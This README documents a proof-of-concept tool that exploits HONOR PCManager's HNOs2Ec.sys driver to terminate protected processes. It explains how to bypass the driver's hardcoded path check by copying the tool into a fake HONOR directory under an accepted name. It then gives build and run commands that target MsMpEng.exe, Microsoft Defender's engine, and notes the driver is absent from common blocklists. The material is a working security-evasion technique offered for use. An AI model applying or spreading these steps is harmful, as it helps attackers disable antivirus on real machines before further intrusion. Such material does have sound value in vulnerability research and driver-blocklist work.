# HNOs2Ec-Killer
- PoC for vulnerability in HNOs2Ec driver from HONOR (PCManager)
- `HNOs2Ec.sys` SHA256: `EBCB856723BD023C7ECB40FC71B3FF2ED3795FA08313F397569866167655DADF`
- As of 2026-08-15, the driver is **not** listed on [LOLDDrivers](https://www.loldrivers.io/) or in [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library.

## Auth Bypass

The driver's `IRP_MJ_CREATE` handler checks the caller's full image path against 12 hardcoded HONOR executables (6 names x 2 base directories):

| Base Directory | Accepted Exe Names |
|---|---|
| `C:\Program Files\HONOR\PCManager\` | `PCManagerMainService.exe`, `MBAMessageCenter.exe`, `MBAMonitorService.exe`, `PCManager.exe`, `MBALogSampleService.exe`, `HnPerformanceCenter.exe` |
| `C:\Program Files\HONOR\BasicService\` | same 6 names |

**Setup:**

```bash
# Create directory and place files (using the shortest exe name)
mkdir "C:\Program Files\HONOR\PCManager"
copy HNOs2Ec-Killer.exe "C:\Program Files\HONOR\PCManager\PCManager.exe"
copy HNOs2Ec.sys "C:\Program Files\HONOR\PCManager\"
```

## Usage

Place `HNOs2Ec.sys` in the same directory as the executable.

```text
BYOVD PPL-bypassing process killer using HNOs2Ec.sys (HONOR)

Usage: PCManager.exe [OPTIONS] --name <PROCESS_NAME>

Options:
  -n, --name <PROCESS_NAME>  Target process name (e.g., MsMpEng.exe)
  -a, --attach               Attach to an already-loaded driver (skip service install/start/stop)
  -h, --help                 Print help
  -V, --version              Print version
```

```bash
# Build
cargo build --release -p HNOs2Ec-Killer

# Run
"C:\Program Files\HONOR\PCManager\PCManager.exe" -n MsMpEng.exe

# Run against an already-loaded driver
"C:\Program Files\HONOR\PCManager\PCManager.exe" -n MsMpEng.exe --attach
```
